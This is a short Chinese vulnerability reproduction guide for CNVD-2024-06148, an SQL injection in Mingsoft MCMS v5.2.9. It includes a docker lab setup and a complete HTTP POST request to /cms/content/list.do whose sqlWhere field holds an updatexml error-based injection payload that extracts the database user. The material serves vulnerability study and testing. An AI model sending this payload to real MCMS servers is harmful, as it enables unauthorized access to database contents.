# CNVD-2024-06148 Mingsoft MCMS v5.2.9 前台查询文章列表接口 SQL注入

MCMS是中国铭飞（MingSoft）公司的一个完整开源的J2ee系统免费可商用的开源Java CMS内容管理系统，它基于SpringBoot 2/前端element UI/提供上百套模板,同时提供实用的插件/每两个月收集issues问题并更新版本/一套简单好用开源免费的Java CMS内容管理系/一整套优质的开源生态内容体系。铭飞的使命就是降低开发成本提高开发效率，提供全方位的企业级开发解决方案。江

MCMS v5.2.9版本存在SQL注入漏洞，该漏洞源于/content/list.do中的categoryType参数缺少对外部输入SQL语句的验证，攻击者可利用该漏洞获取数据库敏感数据。

项目地址https://gitee.com/mingSoft/MCMS

参考链接：

- https://blog.csdn.net/shelter1234567/article/details/137272571
- https://www.cnvd.org.cn/flaw/show/CNVD-2024-06148
- https://gitee.com/mingSoft/MCMS/issues/I8MAJK

## 漏洞环境

执行如下命令启动一个mcms-v5.2.9-web服务器：

```
docker compose up 
```

服务启动后，可访问`http://your-ip:8080/ms/login.do`mcms登录界面

## 漏洞复现

发送该包

```xml
POST /cms/content/list.do HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Connection: close
Content-Length: 326
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

categoryType=1&sqlWhere=%5b%7b%22action%22%3a%22and%22%2c%22field%22%3a%22updatexml(1%2cconcat(0x7e%2c(SELECT%20%20current_user)%2c0x7e)%2c1)%22%2c%22el%22%3a%22eq%22%2c%22model%22%3a%22contentTitle%22%2c%22name%22%3a%22æç« æ é¢%22%2c%22type%22%3a%22input%22%2c%22value%22%3a%22111%22%7d%5d&pageNo=1&pageSize=10
```

![](https://img-blog.csdnimg.cn/direct/2efe237d0a964b70bf0f2fa850532cdb.png)